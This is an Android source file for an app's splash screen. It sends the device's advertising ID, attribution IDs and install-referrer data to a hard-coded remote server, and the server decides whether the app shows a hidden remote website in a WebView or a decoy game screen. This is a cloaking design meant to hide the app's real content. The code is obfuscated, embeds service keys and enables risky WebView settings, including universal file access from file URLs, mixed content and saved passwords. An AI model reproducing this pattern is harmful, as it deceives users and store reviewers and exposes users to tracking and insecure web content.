package wind.win.com;

import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.onesignal.OSNotification;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import io.michaelrocks.paranoid.Obfuscate;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
@Obfuscate
public class SplashActivity extends AppCompatActivity {

    private static final String APPSFLYER_ID = "iqu4KZGw8eqAEu85xnRnXD";
    private static final String ONESIGNAL_APP_ID = "29617eea-6426-4842-ae48-8c2a7336e454";
    private SharedPreferences save;
    private ValueCallback<Uri[]> uploadMessage = null;
    private String advertId = "", visitorId = "";
    private String utm_source = "";
    private String utm_medium = "";
    private String campaign = "";
    private WebView webView;
    public static final int REQUEST_SELECT_FILE = 100;
    private static final String START_URL = "https://aso-int-site.pp.ua/";
    private static final String BUNDLE_ID = BuildConfig.APPLICATION_ID;
    private ProgressBar spinner;
    private boolean firstTime = true;
    private boolean urlLoading = false;
    private InstallReferrerClient referrerClient;


    @RequiresApi(api = Build.VERSION_CODES.GINGERBREAD)
    @SuppressLint({"SetJavaScriptEnabled"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        spinner = (ProgressBar)findViewById(R.id.progressBar);
        setupWebView(webView);

        save = getSharedPreferences("save", MODE_PRIVATE);

        AsyncTask.execute(() -> {
            try {
                initAppsflyer();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            advertId = save.getString("advertId", "");
            if (advertId.isEmpty()) {
                try {
                    AdvertisingIdClient.Info idInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
                    advertId = idInfo.getId();
                    save.edit()
                            .putString("adId", advertId)
                            .apply();
                    setOnesignal(advertId);
                } catch (GooglePlayServicesNotAvailableException | GooglePlayServicesRepairableException | IOException e) {
                    e.printStackTrace();
                }
            } else {
                setOnesignal(advertId);
            }

            boolean user = save.getBoolean("user", true);
            if(user){
                if (!save.getString("product_url", "").isEmpty()){
                    visitorId = save.getString("visitorId", "");
                    runOnUiThread(() -> webView.loadUrl(save.getString("product_url", "")));
                    OneSignal.setExternalUserId(visitorId);
                } else {
                    AsyncTask.execute(() -> {
                        referrerClient = InstallReferrerClient.newBuilder(this).build();
                        referrerClient.startConnection(new InstallReferrerStateListener() {
                            @Override
                            public void onInstallReferrerSetupFinished(int responseCode) {
                                switch (responseCode) {
                                    case InstallReferrerClient.InstallReferrerResponse.OK:
                                        try {
                                            ReferrerDetails refDet = referrerClient.getInstallReferrer();
                                            String refUrl = refDet.getInstallReferrer();
                                            utm_source = refUrl.substring(refUrl.indexOf("=") + 1, refUrl.indexOf("&"));
                                            utm_medium = refUrl.substring(refUrl.lastIndexOf("=") + 1);
                                            save.edit()
                                                    .putString("utm_source", utm_source)
                                                    .putString("utm_medium", utm_medium)
                                                    .apply();

                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                        break;
                                    case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                                    case InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE:
                                        break;
                                }
                                try {
                                    if(!urlLoading){
                                        urlLoading = true;
                                        startHttpClient();
                                    }

                                } catch (JSONException | InterruptedException e) {
                                    e.printStackTrace();
                                }

                            }

                            @Override
                            public void onInstallReferrerServiceDisconnected() {
                                try {
                                    if(!urlLoading){
                                        urlLoading = true;
                                        startHttpClient();
                                    }

                                } catch (JSONException | InterruptedException e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    });
                }
            } else {
                changeActivity();
            }
        });
    }

    private void initAppsflyer() throws InterruptedException {
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(false);
        AppsFlyerLib.getInstance().setDebugLog(true);
        AppsFlyerLib.getInstance().init(APPSFLYER_ID, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionDataMap) {
                campaign = conversionDataMap.get("campaign").toString();
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
            }

        }, this);
        AppsFlyerLib.getInstance().start(this);
    }


    public void startHttpClient() throws JSONException, InterruptedException {
        String apsUID = AppsFlyerLib.getInstance().getAppsFlyerUID(this);


        utm_source = save.getString("utm_source", "");
        utm_medium = save.getString("utm_medium", "");

        JSONObject jsonObject = new JSONObject();

        jsonObject.put("bundle_id" , BUNDLE_ID);
        jsonObject.put("appsflyer_device_id" , apsUID);
        jsonObject.put("advertising_id", advertId);
        jsonObject.put("utm_source" , utm_source);
        jsonObject.put("utm_medium", utm_medium);


        jsonObject.put("campaign" , campaign);

        RequestBody body = RequestBody.create(
                MediaType.parse("application/json"), jsonObject.toString());

        String buildUrl = START_URL + "api/user/check/v3/";

        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(buildUrl)
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                changeActivity();
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {

                String serverAnswer = Objects.requireNonNull(response.body()).string();
                try {
                    JSONObject answerObj = new JSONObject(serverAnswer);

                    String product_url = answerObj.optString("url");

                    if(!product_url.isEmpty()){

                        visitorId  = answerObj.getString("visitor_id");
                        OneSignal.setExternalUserId(visitorId);

                        save.edit()
                                .putString("product_url", product_url)
                                .putString("visitor_id", visitorId)
                                .apply();

                        AnalyticSingleton.getInstance(getApplicationContext()).logEvent("open_web");
                        runOnUiThread(() -> webView.loadUrl(product_url));

                    } else {

                        boolean is_first_engagement = answerObj.getBoolean("is_first_engagement");

                        if(is_first_engagement){
                            OneSignal.disablePush(true);
                            save.edit()
                                    .putBoolean("user", false)
                                    .apply();

                        }
                        changeActivity();
                        throw new IOException();
                    }

                } catch (JSONException e) {
                    changeActivity();
                }

            }

        });

    }




    private void setOnesignal(String advertId){

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.setAppId(ONESIGNAL_APP_ID);
        OneSignal.setNotificationOpenedHandler(osNotificationOpenedResult -> {

            OSNotification notification = osNotificationOpenedResult.getNotification();
            JSONObject jsonSignal = new JSONObject();
            try {
                jsonSignal.put("push_id", notification.getNotificationId());
                jsonSignal.put("add_id", advertId);
                jsonSignal.put("af_dev", AppsFlyerLib.getInstance().getAppsFlyerUID(this));
                jsonSignal.put("data", notification.getAdditionalData().toString());
                jsonSignal.put("bundle", BuildConfig.APPLICATION_ID);

            } catch (JSONException e) {
                e.printStackTrace();
            }

            RequestBody body = RequestBody.create(
                    MediaType.parse("application/json"), jsonSignal.toString());

            Request signalRequest = new Request.Builder()
                    .url("https://aso-int-site.pp.ua/os/click")
                    .post(body)
                    .build();

            OkHttpClient client = new OkHttpClient();
            AsyncTask.execute(() -> {
                try {
                    client.newCall(signalRequest).execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        });

        OneSignal.unsubscribeWhenNotificationsAreDisabled(true);
        OneSignal.initWithContext(getApplicationContext());
        OneSignal.setAppId(ONESIGNAL_APP_ID);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView(WebView webView){

        WebSettings webViewSettings = webView.getSettings();

        webViewSettings.setJavaScriptEnabled(true);
        String[] preparedUserAgentArray = webView.getSettings().getUserAgentString().split("\\)");
        StringBuilder userAgent = new StringBuilder();
        for(int i = 1 ; i < preparedUserAgentArray.length ; i++){
            userAgent.append(preparedUserAgentArray[i]);
        }
        webViewSettings.setUserAgentString(userAgent.toString());
        webViewSettings.setAllowContentAccess(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        CookieManager.getInstance().setAcceptCookie(true);
        webViewSettings.setSupportZoom(false);
        webViewSettings.setDomStorageEnabled(true);
        webViewSettings.setSavePassword(true);
        webViewSettings.setSaveFormData(true);
        webViewSettings.setDatabaseEnabled(true);
        webViewSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        webViewSettings.setMixedContentMode(0);
        webViewSettings.setAllowFileAccess(true);
        webViewSettings.setAllowFileAccessFromFileURLs(true);
        webViewSettings.setAllowUniversalAccessFromFileURLs(true);
        webViewSettings.setUseWideViewPort(true);
        webViewSettings.setLoadWithOverviewMode(true);
        webViewSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        webViewSettings.setLoadsImagesAutomatically(true);
        webView.setFocusable(true);
        webView.setFocusableInTouchMode(true);
        webView.setSaveEnabled(true);
        webView.setDownloadListener((s, s1, s2, s3, l) -> {
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(s));
            startActivity(i);
        });

        WebChromeClient webChromeClient = new WebChromeClient(){
            @Override
            public boolean onShowFileChooser(WebView webView1, ValueCallback<Uri[]> filePathCallBack, FileChooserParams fileChooserParams){

                uploadMessage = filePathCallBack;
                Intent intent = fileChooserParams.createIntent();
                try{
                    startActivityForResult(intent, REQUEST_SELECT_FILE);
                } catch (ActivityNotFoundException e) {
                    uploadMessage = null;
                    return false;
                }
                return true;
            }
        };

        webView.setWebChromeClient(webChromeClient);

        webView.setWebViewClient(new WebViewClient(){

            @Override
            public void onPageStarted(WebView view, String url, Bitmap facIcon) {
                if(firstTime){
                    spinner.setVisibility(View.VISIBLE);

                }
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                spinner.setVisibility(View.GONE);
                firstTime = false;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url){

                if(url.startsWith("tg:")){
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                    intent.setData(Uri.parse(url));
                    view.getContext().startActivity(intent);
                    return true;
                }

                if(url.startsWith("mailto")){
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("plain/text");
                    intent.putExtra(Intent.EXTRA_EMAIL, url.replace("mailto", ""));
                    view.getContext().startActivity(Intent.createChooser(intent, "Send email"));
                    return true;
                }

                if(url.startsWith("tel:")){
                    Intent intent = new Intent(Intent.ACTION_DIAL);
                    intent.setData(Uri.parse(url));
                    view.getContext().startActivity(intent);
                    return true;
                }

                if(url.startsWith("https://diia.app")){
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                    intent.getData().getAuthority();
                    view.getContext().startActivity(intent);
                    return true;
                }

                if(url.startsWith("https://t.me/joinchat")){
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                    view.getContext().startActivity(intent);
                    return true;
                }
                return false;
            }
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == REQUEST_SELECT_FILE) {
            if (uploadMessage == null)
                return;
            uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
            uploadMessage = null;
        }
    }

    @Override
    public void onBackPressed(){
        if (webView.canGoBack()) {
            webView.goBack();
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        AnalyticSingleton.getInstance(this).logActivity(this);
    }

    public void changeActivity(){
        runOnUiThread(() -> {
            Intent intent = new Intent(SplashActivity.this, GameActivity.class);
            startActivity(intent);
            finish();
        });
    }
}